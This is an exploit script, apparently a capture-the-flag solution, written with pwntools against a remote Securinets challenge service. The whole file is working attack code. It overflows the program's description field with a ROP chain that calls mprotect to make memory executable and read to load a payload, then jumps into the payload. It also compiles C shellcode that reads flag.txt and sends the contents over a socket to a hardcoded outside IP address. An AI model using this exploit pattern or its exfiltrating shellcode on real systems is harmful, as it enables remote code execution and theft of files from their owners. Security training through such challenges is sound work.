#!/usr/bin/env python3
from pwn import *
import struct
import tempfile
import subprocess
import os


def connect():
    if args.LOCAL:
        if args.GDB:
            return gdb.debug(["./main"], api=True)
        else:
            return process(["./main"])
    else:
        return remote("pwn.ctf.securinets.tn", 7777)
        #return remote("localhost", 4003)


def set_username(tube, username):
    tube.send(b"1\n" + username)


def set_description(tube, description):
    tube.send(b"2\n" + description)


def quit(tube):
    tube.send(b"3\n")


def cc(src):
    with tempfile.TemporaryDirectory() as workdir:
        with open(os.path.join(workdir, "shellcode.c"), "w") as fp:
            fp.write(src)
        with open(os.path.join(workdir, "shellcode.lds"), "w") as fp:
            fp.write(
                """
SECTIONS {
    .shellcode : {
        *(.text)
        *(.rodata*)
    }
    /DISCARD/ : { *(*) }
}
"""
            )
        subprocess.check_call(
            [
                "gcc",
                "-Os",
                "-fno-stack-protector",
                "-fcf-protection=none",
                "-Wall",
                "-Wextra",
                "-Werror",
                "-nostartfiles",
                "-Wl,--build-id=none",
                "-Wl,-script=shellcode.lds",
                "shellcode.c",
                "-o",
                "shellcode.elf",
            ],
            cwd=workdir,
        )
        subprocess.check_call(
            [
                "objcopy",
                "-O",
                "binary",
                "--only-section=.shellcode",
                "shellcode.elf",
                "shellcode.bin",
            ],
            cwd=workdir,
        )
        subprocess.check_call(
            [
                "objdump",
                "-b",
                "binary",
                "-m",
                "i386:x86-64",
                "-D",
                "shellcode.bin",
            ],
            cwd=workdir,
        )
        with open(os.path.join(workdir, "shellcode.bin"), "rb") as fp:
            return fp.read()


SHELLCODE = cc(
    r"""
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define __NR_read 0
#define __NR_write 1
#define __NR_open 2
#define __NR_socket 41
#define __NR_connect 42

__attribute__((always_inline)) static inline long
_syscall(int number, long arg1, long arg2, long arg3, long arg4, long arg5,
         long arg6) {
  register int rax asm("rax") = number;
  register long rdi asm("rdi") = arg1;
  register long rsi asm("rsi") = arg2;
  register long rdx asm("rdx") = arg3;
  register long r10 asm("r10") = arg4;
  register long r8 asm("r8") = arg5;
  register long r9 asm("r9") = arg6;
  asm volatile("syscall\n"
               : "+r"(rax), "+r"(rdx)
               : "r"(rdi), "r"(rsi), "r"(r10), "r"(r8), "r"(r9)
               : "rcx", "r11", "memory", "cc");
  return rax;
}

__attribute__((always_inline)) static inline ssize_t _read(int fd, void *buf,
                                                           size_t count) {
  return _syscall(__NR_read, fd, (long)buf, count, 0, 0, 0);
}

__attribute__((always_inline)) static inline ssize_t
_write(int fd, const void *buf, size_t count) {
  return _syscall(__NR_write, fd, (long)buf, count, 0, 0, 0);
}

__attribute__((always_inline)) static inline int _open(const char *pathname,
                                                       int flags, mode_t mode) {
  return _syscall(__NR_open, (long)pathname, flags, mode, 0, 0, 0);
}

static inline int _socket(int domain, int type, int protocol) {
  return _syscall(__NR_socket, domain, type, protocol, 0, 0, 0);
}

static inline int _connect(int sockfd, const struct sockaddr *addr,
                           socklen_t addrlen) {
  return _syscall(__NR_connect, sockfd, (long)addr, addrlen, 0, 0, 0);
}

void shellcode(void) {
  char buf[128];
  int fd = _open("flag.txt", 0, 0);
  ssize_t n = _read(fd, buf, sizeof(buf));
  _write(1, buf, n);
  _write(2, buf, n);
  int sfd = _socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = 0x203a;
  sin.sin_addr.s_addr = 0x9d1fd9b2;
  *(long *)sin.sin_zero = 0;
  _connect(sfd, (const struct sockaddr *)&sin, sizeof(sin));
  _write(sfd, buf, n);
}
"""
)


def main():
    read = 0x431BC0
    mprotect = 0x432920
    buf = 0x400000
    pop_rdi = 0x401F3D
    pop_rsi = 0x40AB23
    pop_rdx_rbx = 0x463367
    with connect() as tube:
        if args.LOCAL and args.GDB:
            # tube.gdb.execute("b *0x4017CD")  # readUsername()
            tube.gdb.continue_nowait()
        rop = b"".join(
            (
                # mprotect(buf, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
                struct.pack("<QQ", pop_rdi, buf),
                struct.pack("<QQ", pop_rsi, 0x1000),
                struct.pack("<QQQ", pop_rdx_rbx, 7, 0),
                struct.pack("<Q", mprotect),
                # read(0, buf, 0x1000)
                struct.pack("<QQ", pop_rdi, 0),
                struct.pack("<QQ", pop_rsi, buf),
                struct.pack("<QQQ", pop_rdx_rbx, 0x1000, 0),
                struct.pack("<Q", read),
                # buf()
                struct.pack("<Q", buf),
            )
        )
        assert b"\n" not in rop
        assert len(rop) <= 143

        set_username(tube, flat({16: b"\xA8"}))
        set_description(
            tube,
            flat(
                {
                    0: rop,
                    143: b"\n"
                },
            ),
        )
        set_username(tube, flat({16: b"\x00"}))
        quit(tube)
        time.sleep(3)
        tube.send(SHELLCODE)
        # tube.recvuntil(b"FLAG\n")
        # tube.interactive()
        tube.recvall()
        # Securinets{626c656272591c0a935d1556ed9f8e80439ff02869c0590c9689f63ce51d9f08}


if __name__ == "__main__":
    main()
